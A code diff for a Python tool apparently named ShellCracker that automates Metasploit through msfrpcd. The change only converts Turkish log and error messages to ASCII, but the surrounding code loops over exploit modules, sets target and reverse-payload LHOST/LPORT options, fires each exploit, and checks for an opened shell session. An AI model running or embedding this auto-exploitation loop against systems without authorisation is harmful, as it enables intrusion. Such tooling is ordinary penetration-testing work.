@@ -71,7 +71,7 @@ def connect(
         from pymetasploit3.msfrpc import MsfRpcClient
     except ImportError as exc:  # pragma: no cover - dependency guard
         raise MsfConnectionError(
-            "pymetasploit3 kurulu değil. Çalıştır: pip install -r requirements.txt"
+            "pymetasploit3 kurulu degil. Calistir: pip install -r requirements.txt"
         ) from exc
 
     try:
@@ -85,14 +85,14 @@ def connect(
         if not ssl:
             start_cmd += " -S"  # -S disables SSL
         raise MsfConnectionError(
-            f"msfrpcd'ye bağlanılamadı ({host}:{port}, ssl={ssl}): {exc}\n\n"
-            "ShellCracker Metasploit servislerini senin yerine başlatmaz. RPC "
-            "servisini başka bir terminalde başlat ve tekrar dene:\n\n"
+            f"msfrpcd'ye baglanilamadi ({host}:{port}, ssl={ssl}): {exc}\n\n"
+            "ShellCracker Metasploit servislerini senin yerine baslatmaz. RPC "
+            "servisini baska bir terminalde baslat ve tekrar dene:\n\n"
             f"    {start_cmd}\n"
         ) from exc
 
     logger.info(
-        "msfrpcd bağlantısı kuruldu %s (framework %s)",
+        "msfrpcd baglantisi kuruldu %s (framework %s)",
         f"{host}:{port}",
         client.core.version.get("version", "?"),
     )
@@ -106,7 +106,7 @@ def start_msfrpcd(
     cmd = ["msfrpcd", "-U", user, "-P", password, "-p", str(port), "-a", host]
     if not ssl:
         cmd.append("-S")  # -S disables SSL
-    logger.info("msfrpcd başlatılıyor: %s", " ".join(cmd))
+    logger.info("msfrpcd baslatiliyor: %s", " ".join(cmd))
     return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
@@ -132,11 +132,11 @@ def connect_or_start(
     try:
         return connect(host, port, user, password, ssl), None
     except MsfConnectionError:
-        logger.info("Çalışan msfrpcd bulunamadı; otomatik başlatılıyor.")
+        logger.info("Calisan msfrpcd bulunamadi; otomatik baslatiliyor.")
 
     if shutil.which("msfrpcd") is None:
         raise MsfConnectionError(
-            "msfrpcd PATH'te bulunamadı. Metasploit kurulu mu?\n"
+            "msfrpcd PATH'te bulunamadi. Metasploit kurulu mu?\n"
             "    Kurulum: sudo apt install metasploit-framework"
         )
 
@@ -146,13 +146,13 @@ def connect_or_start(
     while time.time() < deadline:
         if proc.poll() is not None:
             raise MsfConnectionError(
-                f"msfrpcd başlatıldı ama beklenmedik şekilde kapandı "
-                f"(çıkış kodu {proc.returncode}). 'msfrpcd' komutunu elle "
-                "çalıştırıp hatayı görebilirsin."
+                f"msfrpcd baslatildi ama beklenmedik sekilde kapandi "
+                f"(cikis kodu {proc.returncode}). 'msfrpcd' komutunu elle "
+                "calistirip hatayi gorebilirsin."
             )
         try:
             client = connect(host, port, user, password, ssl)
-            logger.info("msfrpcd otomatik başlatıldı ve bağlanıldı.")
+            logger.info("msfrpcd otomatik baslatildi ve baglanildi.")
             return client, proc
         except MsfConnectionError as exc:
             last_err = str(exc).splitlines()[0]
@@ -163,7 +163,7 @@ def connect_or_start(
     except Exception:  # noqa: BLE001
         pass
     raise MsfConnectionError(
-        f"msfrpcd {boot_timeout} sn içinde hazır olmadı. Son hata: {last_err}"
+        f"msfrpcd {boot_timeout} sn icinde hazir olmadi. Son hata: {last_err}"
     )
 
 
@@ -235,7 +235,7 @@ def _verify_session(client: Any, sid: int) -> tuple[bool, str, str]:
             proof = session.read() or ""
         return bool(proof.strip()), stype, proof.strip()
     except Exception as exc:  # noqa: BLE001 - verification is best-effort
-        return False, "", f"doğrulama hatası: {exc}"
+        return False, "", f"dogrulama hatasi: {exc}"
 
 
 class Executor:
@@ -281,9 +281,9 @@ class Executor:
         try:
             exploit = self.client.modules.use("exploit", candidate.module)
         except Exception as exc:  # noqa: BLE001 - module missing/renamed
-            record.reason = f"modül yüklenemedi: {exc}"
+            record.reason = f"modul yuklenemedi: {exc}"
             record.finished_at = datetime.now().isoformat(timespec="seconds")
-            logger.warning("  atlanıyor: %s", record.reason)
+            logger.warning("  atlaniyor: %s", record.reason)
             return record
 
         # Target + port.
@@ -292,7 +292,7 @@ class Executor:
             if candidate.service_port:
                 exploit["RPORT"] = candidate.service_port
         except Exception as exc:  # noqa: BLE001
-            record.reason = f"hedef seçenekleri ayarlanamadı: {exc}"
+            record.reason = f"hedef secenekleri ayarlanamadi: {exc}"
             record.finished_at = datetime.now().isoformat(timespec="seconds")
             return record
 
@@ -318,9 +318,9 @@ class Executor:
             # "not vulnerable"/"safe" code to avoid wasting an attempt.
             low = record.check_result.lower()
             if "not vulnerable" in low or low == "safe":
-                record.reason = f"check hedefi savunmasız bulmadı ({record.check_result})"
+                record.reason = f"check hedefi savunmasiz bulmadi ({record.check_result})"
                 record.finished_at = datetime.now().isoformat(timespec="seconds")
-                logger.info("  atlanıyor: %s", record.reason)
+                logger.info("  atlaniyor: %s", record.reason)
                 return record
 
         # Build the payload object with reverse-handler settings.
@@ -329,17 +329,17 @@ class Executor:
             payload_obj["LHOST"] = lhost
             payload_obj["LPORT"] = lport
         except Exception as exc:  # noqa: BLE001
-            record.reason = f"payload kurulumu başarısız: {exc}"
+            record.reason = f"payload kurulumu basarisiz: {exc}"
             record.finished_at = datetime.now().isoformat(timespec="seconds")
             return record
 
         before = self._current_session_ids()
-        logger.info("  ateşleniyor: %s  LHOST=%s LPORT=%s", payload, lhost, lport)
+        logger.info("  atesleniyor: %s  LHOST=%s LPORT=%s", payload, lhost, lport)
         try:
             exploit.execute(payload=payload_obj)
             record.fired = True
         except Exception as exc:  # noqa: BLE001 - target not suitable, etc.
-            record.reason = f"execute() başarısız: {exc}"
+            record.reason = f"execute() basarisiz: {exc}"
             record.finished_at = datetime.now().isoformat(timespec="seconds")
             logger.warning("  %s", record.reason)
             return record
@@ -347,7 +347,7 @@ class Executor:
         # Poll for a new session (reverse connections take a moment).
         sid = self._wait_for_session(before, timeout=25)
         if sid is None:
-            record.reason = "süre içinde oturum açılmadı"
+            record.reason = "sure icinde oturum acilmadi"
             record.finished_at = datetime.now().isoformat(timespec="seconds")
             logger.info("  %s", record.reason)
             return record
@@ -359,13 +359,13 @@ class Executor:
         record.proof = proof
         record.success = ok
         record.reason = (
-            "oturum doğrulandı" if ok
-            else "oturum açıldı ama doğrulama çıktı üretmedi"
+            "oturum dogrulandi" if ok
+            else "oturum acildi ama dogrulama cikti uretmedi"
         )
         record.finished_at = datetime.now().isoformat(timespec="seconds")
-        logger.info("  OTURUM %s (%s) başarı=%s", sid, stype or "?", ok)
+        logger.info("  OTURUM %s (%s) basari=%s", sid, stype or "?", ok)
         if proof:
-            logger.info("  kanıt:\n%s", proof)
+            logger.info("  kanit:\n%s", proof)
         return record
 
     def _wait_for_session(self, before: set[int], timeout: int = 25) -> int | None:
@@ -389,10 +389,10 @@ class Executor:
             record = self.try_candidate(candidate)
             records.append(record)
             if record.success:
-                logger.info("Shell alındı -- aday döngüsü durduruluyor.")
+                logger.info("Shell alindi -- aday dongusu durduruluyor.")
                 break
             if i < min(max_attempts, len(candidates)):
-                logger.info("Sonraki denemeden önce %d sn bekleniyor...", delay)
+                logger.info("Sonraki denemeden once %d sn bekleniyor...", delay)
                 time.sleep(delay)
 
         return records
@@ -410,5 +410,5 @@ class Executor:
                 self.client.sessions.session(sid).stop()
                 logger.info("Oturum %s temizlendi", sid)
             except Exception as exc:  # noqa: BLE001 - best effort
-                logger.debug("Oturum %s durdurulamadı: %s", sid, exc)
+                logger.debug("Oturum %s durdurulamadi: %s", sid, exc)
         self._owned_sessions.clear()
